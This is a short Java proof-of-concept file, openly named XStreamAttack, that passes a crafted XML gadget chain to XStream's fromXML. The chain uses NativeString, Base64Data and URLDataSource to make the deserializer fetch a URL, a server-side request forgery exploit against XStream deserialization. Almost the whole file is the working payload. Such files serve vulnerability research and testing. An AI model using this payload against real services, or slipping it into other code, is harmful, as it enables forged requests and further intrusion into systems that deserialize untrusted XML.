package org.example;

import com.thoughtworks.xstream.XStream;

public class XStreamAttack {

    public static void main(String[] args) {
        XStream xstream = new XStream();

        String xml = """
                <map>
                   <entry>
                     <jdk.nashorn.internal.objects.NativeString>
                       <flags>0</flags>
                       <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                         <dataHandler>
                           <dataSource class='javax.activation.URLDataSource'>
                             <url>http://ya.ru</url>
                           </dataSource>
                           <transferFlavors/>
                         </dataHandler>
                         <dataLen>0</dataLen>
                       </value>
                     </jdk.nashorn.internal.objects.NativeString>
                     <string>test</string>
                   </entry>
                 </map>""";

        xstream.fromXML(xml);
    }
}

